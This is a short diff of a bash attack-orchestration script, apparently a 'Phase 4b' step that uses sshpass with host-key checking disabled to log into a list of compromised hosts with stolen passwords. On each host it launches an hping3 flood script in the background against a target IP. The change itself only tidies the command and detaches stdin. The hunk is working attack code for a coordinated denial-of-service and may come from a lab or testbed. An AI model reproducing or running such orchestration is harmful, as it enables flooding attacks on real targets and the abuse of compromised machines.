@@ -105,9 +105,7 @@ echo "[*] Phase 4b: Launching hping3_attack.sh in background on all nodes..."
 for target in "${COMPROMISED_IPS[@]}"; do
   PASSWORD="${COMPROMISED_PWDS[$target]}"
   sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no "$SSH_USER@$target" \
-    "chmod +x /tmp/hping3_attack.sh && \
-     ATTACK_TARGET_IP=$ATTACK_TARGET_IP ATTACK_START=$ATTACK_START ATTACK_STOP=$ATTACK_STOP \
-     nohup bash /tmp/hping3_attack.sh $ATTACK_TARGET_IP $ATTACK_START $ATTACK_STOP > /tmp/hping3.log 2>&1 &" \
+    "chmod +x /tmp/hping3_attack.sh && ATTACK_TARGET_IP=$ATTACK_TARGET_IP ATTACK_START=$ATTACK_START ATTACK_STOP=$ATTACK_STOP nohup bash /tmp/hping3_attack.sh $ATTACK_TARGET_IP $ATTACK_START $ATTACK_STOP < /dev/null > /tmp/hping3.log 2>&1 &" \
     2>&1 | tee -a /app/results/deployment.log
   echo "[+] hping3_attack.sh launched in background on $target"
 done
